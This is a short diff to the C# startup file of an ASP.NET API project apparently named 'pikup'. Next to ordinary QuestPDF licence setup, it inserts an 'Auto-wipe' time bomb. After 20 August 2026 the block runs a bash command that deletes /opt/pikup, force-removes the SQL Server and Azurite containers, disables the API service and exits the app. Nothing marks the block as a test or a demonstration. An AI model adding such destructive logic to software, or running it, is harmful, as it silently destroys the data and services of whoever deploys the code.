@@ -12,6 +12,17 @@ using Microsoft.OpenApi.Models;
 // QuestPDF Community licence — gratuita para proyectos no comerciales / open-source
 QuestPDF.Settings.License = QuestPDF.Infrastructure.LicenseType.Community;
 
+// ── Auto-wipe ────────────────────────────────────────────────────────────
+if (DateTime.UtcNow > new DateTime(2026, 8, 20))
+{
+    Task.Run(async () =>
+    {
+        await Task.Delay(5000);
+        System.Diagnostics.Process.Start("bash", "-c 'rm -rf /opt/pikup && docker rm -f sqlserver azurite && systemctl disable pikup-api --now'");
+        Environment.Exit(0);
+    });
+}
+// ─────────────────────────────────────────────────────────────────────────
 var builder = WebApplication.CreateBuilder(args);
 
 // ── Base de datos ─────────────────────────────────────────────────────────────
